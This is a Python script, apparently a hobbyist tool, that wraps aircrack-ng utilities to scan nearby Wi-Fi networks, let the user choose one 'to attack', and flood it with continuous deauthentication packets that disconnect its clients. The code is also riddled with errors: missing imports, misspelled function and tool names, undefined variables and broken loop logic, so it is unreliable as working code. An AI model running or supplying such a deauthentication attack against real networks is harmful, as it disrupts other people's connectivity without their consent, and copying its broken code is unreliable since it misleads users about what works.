import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime


ACTIVE_NETWORKS = []
# TO AVOID SSID DUPLICATIONS- #pass ssid % list
def check_ssid(ssid, list):
    check_status = True
    for item in list:
        if len(list) == 0:  # check for null in list
            return check_status
        elif ssid in item['essid']:
            check_status = False # do not add to list if true
            return check_status

######### TO CHECK IF USER IS SU #############

#### removes old .csv before running script.
try:
    if not 'SUDO_UID' in os.environ.keys():
        print('[SYSTEM] Must have SU Privledges.')
except exception as e:
    print('IO ERROR - MUST BE SUPER USER()): ' , e)
    sys.exit(1)
else:
    try:
        for f in os.listdir():
            if '.csv' in f:
                current_files = subprocess.run(['ls', '-la'], capture_output=True, text = True) ## .stdout.decode())
                print(f'[SYSTEM] {current_files}')
                print(f'[SYSTEM] Current Files in Directory:\n {current_files}')
                print('[SYSTEM].csv found in dircotry. moving it to backup folder. ')
                # to get current directory
                directory = os.getcwd()
                try:
                    os.mkdir(directory + "/backup/")
                except:
                    print('Backup folder already exists')
                timestamp = datetime.now()
                #os.rename(file_name, directory + "/backup/" + str(timestamp) + '-' + file_name)
                shutil.move(f, directory + "/backup/" + str(timestamp) + '-' + f)
                ## shutil is better for this.
    except IOError as e:
        print('IO ERROR in parsing listdir()): ' , e)


interface = re.compile("^wlan[0-9]+")  ################## FIGURE THIS OUT #######
wifi_results = interface.findall(subprocess.run(['iwconfig'], capture_output = True).stdout.decode())

try:
    if len(wifi_results) != 0:
        pass
    else:
        print("[SYSTEM] Either change your wifi interface to, or see code.")
        sys.exit(1)
except Exception as e:
    print(stre(e))
    sys.eit(1)
else:
    print(f'[SYSTEM] The following interfaces are available:')
    for index, item in enumerate(wifi_results):
        print(f'({index}, {item}')
    while True:
        user_iw = input('[SYSTEM] Please enter  the interface you want to use')
        try:
            if wifi_results[int(user_iw)]:
                break

            nic = wifi_results[int(user_iw)]
            print('[SYSTEM] Wifi adapter now connected, killing conflicting processes.')
            kill_process = subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'])
            print('[SYSTEM] Putting WIFI into monitor mode: ')
            monitored_mode = subprocess.run(['sudo', 'airdump-ng', 'start', nic])
            discover_ap = subprocess.Popen(
                ['sudo', 'airodump-ng', '-w', 'file', '--write-interval', '1', '--output-format', 'csv', nic + 'mon'], stdout=subprocess.devnull, stderr=subprocess.devnull)

        except Exception as e:
            print(f'Exception found in USER_IW {str(e)})')

## set up the porcess to run airmon ng.  do not forget to clear shell, and check if .csv load is true
try:
    while True:
        subprocess.call('clear', shell = True) ## clears shell
        for file_name in os.listdir():
            if'.csv' in file_name:
                params = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                               'Authentication', 'Power',
                               'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'key']
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, field_names = params)
                    for row in csv_reader:
                        if row['BSSID'] == 'BSSID': #skip bssid, its already listed.
                            pass
                        elif row in ['BSID'] == 'Station MAC': ## GETS RID OF CLIENT DATA.
                            break
                        elif check_ssid(row['ESSID'], ACTIVE_NETWORKS):
                            ACTIVE_NETWORKS.append(row)
            print(f'[SYSTEM] Scanning. Press control+ when you want to select the network you want to attack.\n' )
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")

            for index, item in enumerate(ACTIVE_NETWORKS):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
                while True:
                    choice = input("[SYSTEM] Please make a choice from above. ")
                    try:
                        if ACTIVE_NETWORKS[int(choice)]:
                            hack_ssid = ACTIVE_NETWORKS[int(choice)]["BSSID"]
                            hack_channel = ACTIVE_NETWORKS[int(choice)]["channel"].strip()
                            subprocess.run(["airmon-ng", "start", nic + "mon", hack_channel])
                            subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hack_ssid,
                            wifi_result[int(wifi_interface_choice)] + "mon"])
                    except:
                        print("[SYSTEM] Please Try Again.")
            time.sleep(1)
except KeyboardInterrupt:
    print("\n[SYSTEM] USER EXIT.")







#
